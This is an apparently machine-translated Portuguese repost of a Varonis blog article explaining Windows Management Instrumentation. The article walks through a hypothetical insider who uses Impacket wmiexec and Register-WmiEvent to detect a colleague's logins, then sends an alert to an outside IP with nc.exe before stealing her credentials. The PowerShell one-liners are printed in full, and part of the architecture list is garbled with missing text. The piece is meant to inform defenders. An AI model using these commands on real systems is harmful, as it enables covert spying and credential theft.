<!doctype html>
<html class="no-js" lang="pt">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üë®üèø‚Äçü§ù‚Äçüë®üèª üëºüèΩ üî¶ Guia da Instrumenta√ß√£o de Gerenciamento do Windows (WMI): No√ß√µes b√°sicas sobre ataques WMI üë®üèø‚Äçüç≥ üíÖüèΩ üåº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="O Windows Management Instrumentation (WMI) √© um subsistema do PowerShell que fornece aos administradores acesso a poderosas ferramentas de monitoramen...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Guia da Instrumenta√ß√£o de Gerenciamento do Windows (WMI): No√ß√µes b√°sicas sobre ataques WMI</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O Windows Management Instrumentation (WMI) √© um subsistema do PowerShell que fornece aos administradores acesso a poderosas ferramentas de monitoramento do sistema. Este kit de ferramentas foi concebido como uma ferramenta de administra√ß√£o de sistema r√°pida e eficaz, mas nem todo mundo o usa para bons prop√≥sitos: com sua ajuda, os especialistas podem espionar outros funcion√°rios. O conhecimento dessa vulnerabilidade WMI facilita a detec√ß√£o e o combate a amea√ßas internas. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Neste artigo, examinaremos o que s√£o as ferramentas WMI, por que s√£o necess√°rias e como podem ser usadas para rastrear atividades internas no sistema. Tamb√©m compilamos um guia mais detalhado sobre eventos WMI e espionagem privilegiada, que voc√™ pode </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">baixar gratuitamente.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Breve an√°lise: o que √© o WMI e para que serve?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Damos um exemplo concreto. </font><font style="vertical-align: inherit;">Usando o WMI, voc√™ pode solicitar, por exemplo, todos os arquivos grandes do Excel localizados em um diret√≥rio espec√≠fico e receber uma notifica√ß√£o sempre que criar um arquivo com um determinado tamanho, por exemplo, 1 MB. </font><font style="vertical-align: inherit;">O </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlet Register-WmiEvent</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> permite fazer tudo isso com uma √∫nica linha n√£o muito complicada no PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em boas m√£os, o WMI pode servir a muitos prop√≥sitos, mas tamb√©m pode se tornar uma ferramenta para atividades internas maliciosas. </font><font style="vertical-align: inherit;">Voc√™ pode facilmente imaginar como uma pessoa com os h√°bitos de Edward Snowden usa o WMI para espionar seus colegas. </font><font style="vertical-align: inherit;">Para fazer isso, ele nem precisa de conhecimento t√©cnico especial.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Suponha que nosso insider hipot√©tico "acidentalmente" tenha espionado que seu colega Lex baixe periodicamente grandes arquivos do Excel contendo n√∫meros de previd√™ncia social e outros dados pessoais de clientes. </font><font style="vertical-align: inherit;">Nesse caso, nossa pessoa discreta pode criar algo assim:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:‚Äô and targetInstance.Extension =‚Äôxlsx‚Äô‚Äù -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Este c√≥digo consulta o objeto </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para acessar informa√ß√µes sobre como criar o arquivo do Excel no diret√≥rio especificado e, em seguida, inicia a execu√ß√£o do bloco de scripts. </font><font style="vertical-align: inherit;">No final deste artigo, examinaremos mais detalhadamente como esse bloco de cen√°rio pode parecer no caso de nosso insider hipot√©tico.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Para que √© usado o Kit de Ferramentas de Gerenciamento do Windows?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de come√ßarmos a explorar como o WMI pode ser usado por pessoas de dentro para fins de rastreamento, vale a pena notar que ele tem muitos usos leg√≠timos. </font><font style="vertical-align: inherit;">O objetivo global deste sistema √© reunir todos os controles para dispositivos e aplicativos em redes corporativas. </font><font style="vertical-align: inherit;">Assim, o WMI pode ser usado:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> coletar informa√ß√µes sobre o status de sistemas de computadores locais e remotos </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">configura√ß√µes de seguran√ßa para computadores e aplicativos remotos</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">configurando e editando propriedades do sistema</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">definindo e editando permiss√µes para usu√°rios e grupos autorizados</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">execu√ß√£o de c√≥digo e serializa√ß√£o de objetos (uma </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">esp√©cie de "SSH em ester√≥ides"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">atribuir e editar etiquetas da unidade</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">criando um cronograma de processo</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">reposit√≥rios de objetos de backup</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ativar e desativar o log de erros</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Todos esses recursos podem ser acessados ‚Äã‚Äãusando o PowerShell e o WMIC, a interface da linha de comandos do WMI. </font><font style="vertical-align: inherit;">Como voc√™ pode ver, o WMI possui uma ampla variedade de aplicativos, e esse sistema permite rastrear e editar muitos par√¢metros diferentes em uma rede de computadores.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Arquitetura de instrumenta√ß√£o de gerenciamento do Windows</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O kit de ferramentas WMI faz parte do sistema operacional Windows e √© pr√©-instalado em todos os sistemas operacionais iniciados no Windows 2000. O WMI consiste nos seguintes componentes:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O servi√ßo WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √© uma implementa√ß√£o do sistema WMI no Windows. </font><font style="vertical-align: inherit;">Esse processo aparece sob o nome "Windows Management Instrumentation" e √© o link entre os provedores WMI, o reposit√≥rio WMI e os aplicativos de gerenciamento. </font><font style="vertical-align: inherit;">Esse processo inicia automaticamente quando voc√™ liga o computador.</font></font></li>
<li><strong> </strong> ‚Äî        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> ‚Äî  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> ‚Äî   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O gerenciador de objetos CMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √© um sistema que fica entre o aplicativo de gerenciamento e os provedores WMI. </font><font style="vertical-align: inherit;">Ela solicita dados desses provedores e os transfere para o aplicativo.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A API WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> executa essas opera√ß√µes e fornece aos aplicativos acesso √† infraestrutura WMI sem estar vinculada ao tipo de dispositivo usado.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Um consumidor WMI</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √© uma entidade que envia solicita√ß√µes para objetos atrav√©s do gerenciador de objetos. </font><font style="vertical-align: inherit;">Normalmente, um consumidor WMI √© um aplicativo de monitoramento, como o PRTG Network Monitor, executando o aplicativo ou um script do PowerShell.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fazendo solicita√ß√µes WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A maneira mais f√°cil de executar uma solicita√ß√£o WMI √© executar o WMIC em uma linha de comando padr√£o do Windows. </font><font style="vertical-align: inherit;">Siga estas etapas para obter informa√ß√µes sobre o processador usado no computador local:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Abrir prompt de comando</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Digite WMIC para chamar o programa e pressione Enter </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A janela do prompt de comando do WMIC ser√° exibida.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">No prompt de comando, voc√™ pode executar solicita√ß√µes WMI. </font><font style="vertical-align: inherit;">A solicita√ß√£o mais simples √© visualizar informa√ß√µes sobre o processador local, que podem ser executadas usando o seguinte comando:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Os resultados ser√£o exibidos na linha de comando.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quase todos os comandos que ser√£o discutidos abaixo s√£o executados dessa maneira. </font><font style="vertical-align: inherit;">No entanto, o WMI permite que voc√™ receba informa√ß√µes muito mais detalhadas que as informa√ß√µes do processador, inclusive de computadores e aplicativos remotos.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Workshop sobre o uso de eventos WMI para monitorar um sistema</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nesta se√ß√£o, veremos como usar o WMI para executar comandos e monitorar processos em computadores remotos. </font><font style="vertical-align: inherit;">Essas t√©cnicas podem ser usadas como parte </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">do sistema de an√°lise de comportamento do usu√°rio e da entidade (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> para monitorar automaticamente os processos em todo o sistema e </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">verificar amea√ßas </font></font></a><font style="vertical-align: inherit;"><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">internas</font></a><font style="vertical-align: inherit;"> , evidenciadas por comportamentos suspeitos ou eventos anormais.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Usando a funcionalidade wmiexec do Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No WMI, voc√™ pode executar v√°rias fun√ß√µes al√©m do gerenciamento de eventos. Nele, voc√™ pode iniciar processos e executar comandos nas janelas do Windows em computadores locais e remotos. Por divers√£o, tente digitar o </font><font style="vertical-align: inherit;">comando </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> process call create 'notepad.exe' em uma sess√£o do PowerShell para abrir o antigo editor de texto da Microsoft. Ele usa a maravilhosa ferramenta de linha de comando wmic inclu√≠da no WMI. √ìtimo, certo? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se eu adicionasse a op√ß√£o / Node: e, em seguida, o nome do computador Windows remoto, eu poderia executar o Bloco de Notas nele, desde que eu tenha as permiss√µes apropriadas. √â claro que, em n√≠vel pr√°tico, o wmic √© uma ferramenta indispens√°vel para os administradores de sistemas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de come√ßar a se ressentir: eu sei que existem </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cmdlets</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> equivalentes do </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;">PowerShell</font></a><font style="vertical-align: inherit;"> . No entanto, acho a sintaxe wmic mais f√°cil de lembrar. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seria √≥timo se eu pudesse usar o WMI para criar um pseudo-shell simples e invis√≠vel.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Um pseudo-shell oculto criado com o wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para minha sorte, isso pode ser feito no Impacket. No ambiente de teste da Amazon, usei meu </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> favorito </font><font style="vertical-align: inherit;">para acessar o WMI atrav√©s da m√°quina virtual Linux. O Wmiexec fornece a capacidade de criar um pseudo-shell: cada vez que um comando √© inserido no lado do cliente, um shell separado √© criado no computador de destino para executar esse comando. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O psexec e o smbexec usam os servi√ßos do Windows para executar comandos em um sistema remoto. O Smbexec √© executado silenciosamente, pois cria e exclui rapidamente o servi√ßo, e o psexec, pelo contr√°rio, o deixa √† vista.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A ferramenta wmiexec executa diretamente o cmd.exe para executar o comando remotamente. </font><font style="vertical-align: inherit;">O comando criado pode ser encontrado no visualizador de eventos. </font><font style="vertical-align: inherit;">Observe que evitamos os servi√ßos </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
atraentes do Windows.A ferramenta wmiexec n√£o afeta os servi√ßos, em vez disso, use os recursos WMI descritos acima para iniciar o processo diretamente. </font><font style="vertical-align: inherit;">Ao procurar poss√≠veis fontes de amea√ßas, os especialistas em seguran√ßa raramente come√ßam com o WMI, enquanto os servi√ßos geralmente s√£o um bom lugar para come√ßar a procurar evid√™ncias de um ataque. </font><font style="vertical-align: inherit;">Boa jogada, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Usando eventos WMI para monitorar usu√°rios</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Enquanto eu me divertia com o pensamento de que era t√£o inteligente e experimentava o WMI, os caras envolvidos nos testes de penetra√ß√£o haviam entendido h√° muito tempo como tudo funcionava. Voc√™ definitivamente precisa ler </font><font style="vertical-align: inherit;">a </font><font style="vertical-align: inherit;">incr√≠vel </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">apresenta√ß√£o</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> de Matt Graeber da confer√™ncia Black Hat de 2015, onde ele fala sobre como os invasores podem transformar o WMI e todo o seu arsenal de eventos em uma ferramenta de hackers. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Na minha hist√≥ria, imagino um interno a la Snowden que tenha algum conhecimento t√©cnico, mas n√£o tenha profunda sabedoria em hackers, e que tenha a confian√ßa de outros funcion√°rios. Essa pessoa n√£o precisa saber tudo sobre o WMI. Ele precisa saber apenas o que √© necess√°rio para trabalhar em um computador remoto e acionar eventos.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al√©m dos objetos de arquivo, h√° outra classe interessante de objetos que pode ser aprendida usando o WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Consultar este objeto b√°sico do Windows permite encontrar os usu√°rios que est√£o atualmente no sistema. Voc√™ pode usar o bloco de script de a√ß√£o Register-WmiEvent para executar o script do PowerShell quando um novo usu√°rio fizer logon remotamente. Entendeu? Um invasor pode receber notifica√ß√µes sempre que um usu√°rio que ele monitora efetua login no sistema de destino. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui est√° o que eu esbocei:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" ‚ÄìAction $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A pr√≥xima pergunta √© como programar a execu√ß√£o de um bloco de scripts. Um membro misterioso das minhas fantasias est√° interessado em um usu√°rio espec√≠fico - Cruell. Nosso vil√£o estava lentamente espionando Cruella e agora planeja usar as informa√ß√µes coletadas para quebrar sua conta de trabalho. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A tarefa do bloco de scripts √© verificar quem est√° conectado e determinar se foi Cruella. Escrevi algumas linhas do c√≥digo do PowerShell para esse fim, mas claramente essa n√£o √© a melhor maneira. N√£o uso as informa√ß√µes do evento transmitidas ao bloco de scripts, ou seja, as informa√ß√µes sobre o novo usu√°rio. Eu topo com obst√°culos, as raz√µes pelas quais eu n√£o consigo entender no momento. Isso requer mais conhecimento t√©cnico do que nosso insider hipot√©tico tem ou est√° pronto para adquirir.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Em vez disso, simplesmente examinei a lista de usu√°rios retornados pelo gwmi Win32_Process (tente executar esse cmdlet em uma sess√£o do PowerShell) e os combinei com o par√¢metro Cruell. </font><font style="vertical-align: inherit;">Voc√™ pode admirar minha decis√£o final:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O Register-WmiEvent permite que voc√™ mantenha a furtividade, pois s√≥ √© iniciado quando voc√™ efetua login novamente, em vez de solicitar regularmente o objeto Win32_Process, o que pode ser bastante percept√≠vel. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lembre-se de que nosso insider tenta n√£o atrair aten√ß√£o. </font><font style="vertical-align: inherit;">Ela tem acesso ao sistema remoto atrav√©s de psexec, smbexec ou wmiexec (a maneira mais discreta). </font><font style="vertical-align: inherit;">No entanto, ela n√£o precisa andar constantemente de um lado para o outro no sistema da v√≠tima. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Essa √© a beleza de usar eventos WMI. </font><font style="vertical-align: inherit;">Voc√™ pode aguardar a notifica√ß√£o do Register-WmiEvent e, calmamente, fazer sua jogada.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Integra√ß√£o Netcat e WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas como o script traz as not√≠cias quentes de que o Cruella est√° conectado ao computador de destino? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se voc√™ perceber que eu usei os comandos Netcat acima, voc√™ pode se dar uma vantagem. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">O Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> √© um utilit√°rio conhecido e universal que permite estabelecer conex√µes (opcional para malware). Com ele, voc√™ pode realizar uma conex√£o reversa ou simplesmente enviar mensagens pela rede. Aproveitei esta segunda oportunidade. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script acima envia uma mensagem Netcat no modo de espera e exibe "Cruella logado". Miss√£o cumprida. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voc√™ pode imaginar como nosso scammer despeja hashes com a </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ferramenta Impacket secretsdump</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, decifre o hash das credenciais Cruella e inicie o wmiexec, usando as permiss√µes Cruella, para procurar dados mais valiosos.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 O c√≥digo Register-WmiEvent pode ser executado diretamente. </font><font style="vertical-align: inherit;">Preste aten√ß√£o ao identificador de evento exibido</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Solucionando problemas de monitoramento WMI</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como parte deste exemplo, eu queria executar remotamente (usando o wmiexec) um programa √∫til que me alertaria quando um usu√°rio espec√≠fico, ou seja, Cruella, fizer login. Depois disso, eu poderia redefinir e quebrar suas credenciais com seguran√ßa. Essa seria a maneira mais discreta - acesso remoto e nenhum arquivo. O √∫nico problema, me pareceu a princ√≠pio, era a natureza tempor√°ria dos eventos do WMI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Portanto, eu precisava incluir meu Register-WMIEvent longo obsceno (abaixo) na linha de comando do PowerShell com o par√¢metro ‚Äìnoexit, o que garante que a sess√£o do PowerShell seja salva ap√≥s o Register-Event e, portanto, o evento ser√° salvo.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Quando comecei a trabalhar nisso, percebi que tinha que "converter" caracteres especiais como $ "e | e pass√°-los como literais diretamente para o PowerShell. </font><font style="vertical-align: inherit;">Outra dor de cabe√ßa: acabei tendo que abandonar o uso de linhas verticais porque causavam erros de an√°lise. </font><font style="vertical-align: inherit;">N√£o pergunte. </font><font style="vertical-align: inherit;">Gradualmente, cheguei a esta longa linha de c√≥digo:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parecia promissor e parecia funcionar corretamente de acordo com o log de eventos do Windows no sistema de destino. </font><font style="vertical-align: inherit;">No entanto, olhando mais de perto, percebi que n√£o funciona. </font><font style="vertical-align: inherit;">Estou certo de que, no final, eu poderia traz√™-lo para a forma correta, mas para isso eu precisaria de tempo e caf√©, muito caf√©. </font><font style="vertical-align: inherit;">H√° outra op√ß√£o, um pouco menos discreta e sem arquivo: voc√™ pode usar o smbclient para transferir o script e execut√°-lo diretamente no computador de destino.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A execu√ß√£o remota do complexo cmdlet Register-Event me pareceu absolutamente correta. </font><font style="vertical-align: inherit;">Mas n√£o funcionou. </font><font style="vertical-align: inherit;">Bem </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
. Infelizmente, nesta fase, minhas suposi√ß√µes de que um especialista inteligente, mas n√£o muito experiente, poderia facilmente usar eventos tempor√°rios WMI para vigil√¢ncia secreta come√ßaram a desmoronar.</font></font><br>
<br>
